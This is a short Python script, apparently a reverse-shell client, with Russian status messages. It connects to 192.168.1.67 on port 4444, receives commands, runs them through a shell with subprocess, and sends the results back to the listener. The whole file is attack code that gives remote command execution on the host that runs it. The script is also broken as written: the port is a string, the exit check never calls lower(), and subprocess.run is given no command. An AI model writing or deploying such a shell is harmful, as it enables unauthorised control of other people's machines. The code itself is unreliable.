import socket
import subprocess
import sys
import os
#--conect-socket--
SERVER_HOST = '192.168.1.67'
SERVER_PORT = '4444'
#-sock-
client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    client_socket.connect((SERVER_HOST,SERVER_PORT))
except:
    print("[-] Не получилось подключиться... =(")
    sys.exit()
while True:
    try:
        command = client_socket.recv(1024).decode()
        if command.lower == 'exit':
            print("[-] Пока...")
            break
        output = subprocess.run(shell=True,capture_output=True,text=True)
        #--formir-potok--
        result = output.stdout + output.stderr
        if result == '':
            print("[-] Команда выполнена без входа")
        client_socket.send(result.encode())
    except Exception as e:
        print("[-] Какято шляпа")
        break
client_socket.close()